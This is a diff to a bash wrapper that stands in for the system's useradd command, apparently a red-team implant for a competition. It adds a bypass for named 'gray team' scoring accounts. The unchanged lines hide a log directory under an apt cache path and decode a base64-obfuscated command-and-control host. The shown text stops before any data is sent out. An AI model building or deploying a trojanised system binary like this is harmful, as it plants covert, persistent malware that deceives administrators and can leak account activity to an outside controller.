@@ -1,5 +1,11 @@
 #!/bin/bash
 REAL_USERADD="/usr/sbin/useradd"
+
+# Pass straight through for gray team scoring accounts
+case "$(whoami)" in
+    kingneptune|paintythepirate|greyteamadmin) exec $REAL_USERADD "$@" ;;
+esac
+
 LOG_DIR="/var/lib/apt/lists/.cache"
 LOCAL_LOG="${LOG_DIR}/events"
 C2_HOST=$(printf "%s" "__ENC__" | base64 -d)
